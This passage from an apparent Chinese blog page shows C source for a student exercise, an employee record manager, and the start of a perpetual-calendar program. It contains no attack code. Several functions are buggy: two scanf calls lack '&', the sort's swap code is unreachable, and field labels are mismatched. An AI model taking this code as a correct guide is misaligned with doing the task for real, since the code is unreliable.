st-&gt;Age, st-&gt;Education, st-&gt;Post, st-&gt;Wage, st-&gt;Room, st-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">Delete(p);</span><br><span class="line"><span class="comment">// 保存信息</span></span><br><span class="line">Save_FILE(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete</span><span class="params">(node* s)</span></span><br><span class="line">&#123;</span><br><span class="line">node* t = s-&gt;next;</span><br><span class="line"></span><br><span class="line">s-&gt;next = t-&gt;next;</span><br><span class="line">t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Fix</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要修改的职工的工号：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">node* st = Search_id(id, L);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查无此人！\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">st = st-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出一次所要修改的职工信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, st-&gt;ID, st-&gt;Name, st-&gt;Sex, st-&gt;Age, st-&gt;Education, st-&gt;Post, st-&gt;Wage, st-&gt;Room, st-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改姓名 ---- 1\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改性别 ---- 2\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改班级 ---- 3\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改学历 ---- 4\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改职位 ---- 5\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改工资 ---- 6\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改住址 ---- 7\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改电话 ---- 8\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要修改的信息：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Sex);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入年龄：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, st-&gt;Age);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入学历：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Education);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入职务：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Post);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入工资：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, st-&gt;Wage);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Room);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, st-&gt;Telephone);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;是否继续修改该学生信息？（Yes：1 / No：0）：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改完成后该学生的信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, st-&gt;ID, st-&gt;Name, st-&gt;Sex, st-&gt;Age, st-&gt;Education, st-&gt;Post, st-&gt;Wage, st-&gt;Room, st-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存信息</span></span><br><span class="line">Save_FILE(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Search_Printf</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按照工号查询 ---- 1\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按照姓名查询 ---- 2\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入查询方式：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">char</span> name[<span class="number">50</span>];</span><br><span class="line">node* st;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的工号：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">st = Search_id(id, L);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查无此人！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">st = st-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, st-&gt;ID, st-&gt;Name, st-&gt;Sex, st-&gt;Age, st-&gt;Education, st-&gt;Post, st-&gt;Wage, st-&gt;Room, st-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">st = Search_name(name, L);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查无此人！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">st = st-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, st-&gt;ID, st-&gt;Name, st-&gt;Sex, st-&gt;Age, st-&gt;Education, st-&gt;Post, st-&gt;Wage, st-&gt;Room, st-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按学号进行查找</span></span><br><span class="line">node* <span class="title function_">Search_id</span><span class="params">(<span class="type">int</span> id, node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">node* p = L;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;next-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按姓名进行查找</span></span><br><span class="line">node* <span class="title function_">Search_name</span><span class="params">(<span class="type">char</span> name[], node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">node* p = L;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, p-&gt;next-&gt;Name) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">node* p = L-&gt;next;</span><br><span class="line">Print_Printf();</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|%d\t|%s\t|%s\t|%d\t|%s\t|%s\t|%d\t|%s\t\t|%s\t|\n&quot;</span>, p-&gt;ID, p-&gt;Name, p-&gt;Sex, p-&gt;Age, p-&gt;Education, p-&gt;Post, p-&gt;Wage, p-&gt;Room, p-&gt;Telephone);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print_Printf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|学号\t|姓名\t|性别\t|年龄\t|学历\t|职位\t|工资\t|住址\t\t\t|电话\t\t|\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;________________________________________________________________________________________________\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序职工信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Sort</span><span class="params">(node* L)</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按照工资从大到小排序 ---- 1\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按照工资从小到大排序 ---- 2\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择排序方式：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (node* p = L-&gt;next; p != <span class="literal">NULL</span>; p = p-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (node* q = p; q != <span class="literal">NULL</span>; q = q-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (!cmp_big_Wage(*p, *q))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> (!cmp_small_Wage(*p, *q))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 交换数据域</span></span><br><span class="line">node t = *p;</span><br><span class="line">*p = *q;</span><br><span class="line">*q = t;</span><br><span class="line"><span class="comment">// 处理指针域</span></span><br><span class="line">t.next = p-&gt;next;</span><br><span class="line">p-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next = t.next;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工资从大到小</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp_big_Wage</span><span class="params">(node e1, node e2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> e1.Wage &gt; e2.Wage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 工资从小到大</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp_small_Wage</span><span class="params">(node e1, node e2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> e1.Wage &lt; e2.Wage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 退出管理系统</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;欢迎下次使用职工信息管理系统！&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// 结束程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="综合训练六：万年历系统"><a href="#综合训练六：万年历系统" class="headerlink" title="综合训练六：万年历系统"></a>综合训练六：万年历系统</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：C3ngH</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> year, month, day;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d[<span class="number">2</span>][<span class="number">13</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;,&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125; &#125;;</span><br><span class="line"><span class="type">int</span> LeapYear[<span class="number">12</span>] = &#123; <span class="number">31</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span> &#125;;</span><br><span class="line"><span class="type">int</span> CommonYear[<span class="number">12</span>] = &#123; <span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span> &#125;;</span><br><span class="line"><span class="type">char</span> weekday[<span class="number">7</span>][<span class="number">10</span>] = &#123; <span class="string">&quot;星期一&quot;</span>,<span class="string">&quot;星期二&quot;</span>,<span class="string">&quot;星期三&quot;</span>,<span class="string">&quot;星期四&quot;</span>,<span class="string">&quot;星期五&quot;</span>,<span class="string">&quot;星期六&quot;</span>,<span class="string">&quot;星期日&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caculateWeekDay</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">festival</span><span class="params">(<span class="type">int</span> year1, <span class="type">int</span> month1, <span class="type">int</span> day1, <span class="type">int</span> iWeek)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主菜单</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MainMenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;万年历系统\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.日期转换\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.N天后日期\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3.当前日期\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;4.求节假日\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;5.判断平闰\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;6.退出系统\n&quot;</span>);</span><br><span class="line"><span 